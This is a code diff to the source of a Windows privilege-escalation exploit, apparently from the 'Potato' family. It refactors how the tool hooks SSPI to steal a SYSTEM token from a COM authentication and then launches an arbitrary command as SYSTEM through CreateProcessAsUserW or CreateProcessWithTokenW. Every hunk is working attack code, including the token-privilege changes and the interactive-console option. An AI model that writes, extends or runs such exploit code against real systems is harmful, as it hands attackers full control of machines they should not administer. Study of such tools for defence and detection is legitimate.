@@ -3,18 +3,17 @@
 #include "strsafe.h"
 #include "PotatoTrigger.h"
 #include "SSPIHooks.h"
-#include <userenv.h>
 
 HANDLE g_hEventTokenStolen;
 HANDLE g_hEventAuthTriggered;
 HANDLE g_hTokenStolenPrimary;
 HANDLE g_hTokenStolenSecondary;
-BOOL systemTokenStolen;
-BOOL g_InteractiveMode = FALSE;
+BOOL g_SystemTokenStolen;
+
 void usage();
 void ImpersonateInteractiveSid();
 BOOL EnablePriv(HANDLE hToken, LPCTSTR priv);
-int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline);
+int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interactiveMode);
 BOOL g_TestMode = FALSE;
 
 int wmain(int argc, wchar_t** argv)
@@ -29,6 +28,7 @@ int wmain(int argc, wchar_t** argv)
 	PWCHAR appname = NULL;
 	PWCHAR cmdline = NULL;
 	PWCHAR processtype = NULL;
+	BOOL interactiveMode = FALSE;
 
 	int cnt = 1;
 	while ((argc > 1) && (argv[cnt][0] == '-'))
@@ -65,15 +65,16 @@ int wmain(int argc, wchar_t** argv)
 			--argc;
 			comPort = argv[cnt];
 			break;
+		
 		case 'i':
-			g_InteractiveMode = TRUE;
+			interactiveMode = TRUE;
 			break;
+		
 		case 'h':
 			usage();
 			exit(0);
-		case 'z':
-			g_TestMode = TRUE;
-			break;
+
+
 		default:
 			printf("Wrong Argument: %S\n", argv[cnt]);
 			usage();
@@ -92,7 +93,7 @@ int wmain(int argc, wchar_t** argv)
 	printf("[*] Testing CLSID %S - COM server port %S \n", clsidStr, comPort);
 	g_hEventAuthTriggered = CreateEvent(NULL, TRUE, FALSE, NULL);
 	g_hEventTokenStolen = CreateEvent(NULL, TRUE, FALSE, NULL);
-	systemTokenStolen = FALSE;
+	g_SystemTokenStolen = FALSE;
 	HookSSPIForTokenStealing(clsidStr);
 	ImpersonateInteractiveSid();
 	PotatoTrigger(clsidStr, comPort, g_hEventAuthTriggered);
@@ -101,11 +102,11 @@ int wmain(int argc, wchar_t** argv)
 		printf("[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag. \n");
 	}
 	else {
-		if (WaitForSingleObject(g_hEventTokenStolen, 3000) == WAIT_TIMEOUT && systemTokenStolen) {
+		if (WaitForSingleObject(g_hEventTokenStolen, 3000) == WAIT_TIMEOUT && g_SystemTokenStolen) {
 			printf("[-] Cannot capture a valid SYSTEM token, exiting... \n");
 		}
 		else {
-			if (systemTokenStolen && Juicy(processtype, appname, cmdline))
+			if (g_SystemTokenStolen && Juicy(processtype, appname, cmdline, interactiveMode))
 				printf("[+] Exploit successful! \n");
 			else
 				printf("[-] Exploit failed! \n");
@@ -159,7 +160,7 @@ BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 	return TRUE;
 }
 
-int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline) {
+int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interactiveMode) {
 	wchar_t* command = NULL;
 	wchar_t desktopName[] = L"Winsta0\\default";
 	DWORD maxCmdlineLen = 30000;
@@ -167,12 +168,9 @@ int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline) {
 	BOOL result = FALSE, isImpersonating = FALSE;
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
-	SECURITY_ATTRIBUTES sa;
 	HANDLE hTokenCurrProc;
-	LPVOID lpEnvironment = NULL;
 	DWORD dwCreationFlags = 0;
-	HANDLE hTokenDup, hSystemToken;
-	LPWSTR pwszCurrentDirectory = NULL;
+	DWORD sessionId = 0;
 
 	// This exploit works when you have either SeImpersonate or SeAssignPrimaryToken privileges
 	// We perform some token adjustments to succeed in both cases
@@ -180,6 +178,7 @@ int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline) {
 	if (EnablePriv(hTokenCurrProc, SE_IMPERSONATE_NAME)) {
 		EnablePriv(g_hTokenStolenSecondary, SE_IMPERSONATE_NAME);
 		EnablePriv(g_hTokenStolenSecondary, SE_ASSIGNPRIMARYTOKEN_NAME);
+		EnablePriv(g_hTokenStolenSecondary, SE_TCB_NAME);
 		ImpersonateLoggedOnUser(g_hTokenStolenSecondary);
 		isImpersonating = TRUE;
 	}
@@ -199,6 +198,33 @@ int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline) {
 		StringCchCat(command, maxCmdlineLen, cmdline);
 	}
 
+	if (*processtype == L'u' || *processtype == L'*')
+	{
+		ZeroMemory(&si, sizeof(STARTUPINFO));
+		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+		si.cb = sizeof(STARTUPINFO);
+		si.lpDesktop = desktopName;
+		dwCreationFlags = interactiveMode ? 0 : CREATE_NEW_CONSOLE;
+		if (!interactiveMode) {
+			ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
+			SetTokenInformation(g_hTokenStolenPrimary, TokenSessionId, &sessionId, sizeof(sessionId));
+		}
+		result = CreateProcessAsUserW(g_hTokenStolenPrimary, appname, command, NULL, NULL, FALSE, dwCreationFlags, NULL, L"\\", &si, &pi);
+		if (!result)
+			printf("[-] CreateProcessAsUser Failed to create proc: %d\n", GetLastError());
+		else {
+			printf("[+] CreateProcessAsUser OK\n");
+			if (interactiveMode) {
+				printf("[*] Process output:\n");
+				WaitForSingleObject(pi.hProcess, INFINITE);
+			}
+			CloseHandle(pi.hThread);
+			CloseHandle(pi.hProcess);
+			ret = 1;
+			goto cleanup;
+		}
+	}
+
 	if (*processtype == L't' || *processtype == L'*')
 	{
 		ZeroMemory(&si, sizeof(STARTUPINFO));
@@ -212,53 +238,15 @@ int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline) {
 		else
 		{
 			printf("[+] CreateProcessWithTokenW OK\n");
-			if (isImpersonating) RevertToSelf();
-			if (command != NULL) HeapFree(GetProcessHeap, 0, command);
-			return 1;
+			ret = 1;
+			goto cleanup;
 		}
 	}
-	if (*processtype == L'u' || *processtype == L'*')
-	{
-		ZeroMemory(&si, sizeof(STARTUPINFO));
-		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-		si.cb = sizeof(STARTUPINFO);
-		si.lpDesktop = desktopName;
-		dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
-		dwCreationFlags |= g_InteractiveMode ? 0 : CREATE_NEW_CONSOLE;
-		if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
-			goto cleanup;
 
-		
-		if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
-		{
-			wprintf(L"[-] GetSystemDirectory() failed. Error: %d\n", GetLastError());
-			goto cleanup;
-		}
-		if (!DuplicateTokenEx(g_hTokenStolenPrimary, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup))
-		{
-			wprintf(L"[-] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
-			goto cleanup;
-		}
-		
-		if (!CreateEnvironmentBlock(&lpEnvironment, hTokenDup, FALSE))
-		{
-			wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
-			goto cleanup;
-		}
-		
-		result = CreateProcessAsUserW(hTokenDup, appname, command, NULL, NULL, g_InteractiveMode, dwCreationFlags,lpEnvironment, pwszCurrentDirectory, &si, &pi);
-		if (!result)
-			printf("[-] CreateProcessAsUser Failed to create proc: %d\n", GetLastError());
-		else {
-			printf("[+] CreateProcessAsUser OK\n");
-			fflush(stdout);
-			WaitForSingleObject(pi.hProcess, INFINITE);
-			goto cleanup;
-		}
-	}
-	cleanup:
+cleanup:
 	if (isImpersonating) RevertToSelf();
 	if (command != NULL) HeapFree(GetProcessHeap, 0, command);
+	fflush(stdout);
 	return ret;
 }
 
@@ -275,8 +263,8 @@ void usage()
 	printf("Optional args: \n"
 		"-l <port>: COM server listen port (Default 10247)\n"
 		"-a <argument>: command line argument to pass to program (default NULL)\n"
-		"-c <CLSID> (Default {854A20FB-2D44-457D-992F-EF13785D2B51})\n"
-		"-i Interactive Console (valid only with CreateProcessAsUser)\n"
+		"-c <CLSID>: (Default {854A20FB-2D44-457D-992F-EF13785D2B51})\n"
+		"-i : Interactive Console (valid only with CreateProcessAsUser)\n"
 	);
 
 }
